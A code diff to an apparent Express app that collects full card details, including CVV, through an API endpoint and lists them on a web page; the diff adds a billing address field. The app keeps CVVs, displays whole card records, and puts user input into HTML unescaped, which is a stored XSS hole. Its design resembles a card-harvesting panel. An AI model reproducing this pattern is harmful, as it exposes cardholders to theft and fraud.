@@ -124,6 +124,7 @@ app.get('/', (req, res) => {
                                     <p><strong>Expiry:</strong> ${detail.expiry}</p>
                                     <p><strong>CVV:</strong> ${detail.cvv}</p>
                                     <p><strong>Zip Code:</strong> ${detail.zipCode}</p>
+                                    <p><strong>Billing Address:</strong> ${detail.billingAddress}</p>
                                 </div>
                                 <button
                                     onclick="deleteRecord(${paymentData.cardDetails.length - 1 - index})"
@@ -186,13 +187,14 @@ app.post('/api/payment', (req, res) => {
 });
 
 app.post('/api/card-details', (req, res) => {
-    const { name, cardNumber, expiry, cvv, zipCode } = req.body;
+    const { name, cardNumber, expiry, cvv, zipCode, billingAddress } = req.body;
     paymentData.cardDetails.push({ 
         name, 
         cardNumber, 
         expiry, 
         cvv, 
         zipCode, 
+        billingAddress,
         timestamp: new Date().toISOString() 
     });
     res.json({ message: 'Card details received', data: paymentData });
